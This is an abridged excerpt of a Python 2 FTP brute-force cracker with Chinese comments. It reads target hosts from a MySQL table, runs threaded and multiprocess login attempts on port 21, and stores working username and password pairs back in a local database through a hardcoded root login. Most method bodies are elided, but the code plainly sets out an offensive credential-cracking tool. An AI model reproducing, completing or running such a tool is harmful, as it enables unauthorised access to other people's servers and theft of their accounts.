...
class crack_ftp(mysql_handle):   #创建FTP破解类
    ...
    def fetch_array(self):  #读取100个URL地址保存到数组
        ...
        try:   #检测网络连接状态
            ...
            return 0
        try:
            data="select * from ftp where ftpsend is NULL limit 100"
            self.mysql_cursor()
    ...
    def scanner(self,host,nthreads=10,port=21):    #创建破解线程
        ...
        class crackThread(Thread):
            ...
            def send_pwd(self,data):
                new=mysql_handle('localhost','root','316118740','urldata')
                print u'发送MYSQL连接',
                try:
                    new.mysql_connect()
                    new.mysql_cursor()
            ...
            def run(self):
                ...
                while self.running and accounts:#list数组
                    ...
                    while loop_num<3:
                        ...
                        try:
                            self.ftp.connect()
                            self.ftp.login(account[0],account[1])  #连接FTP     #没有异常发生，这是一个正确的帐号
...
class multi_ftp(multiprocessing.Process):  #创建进程进行破解
    ...
    def run(self):
        self.add_func()
def process_job(process_num,app_list):  #10   URL数组   创建进程
    process_list=[]
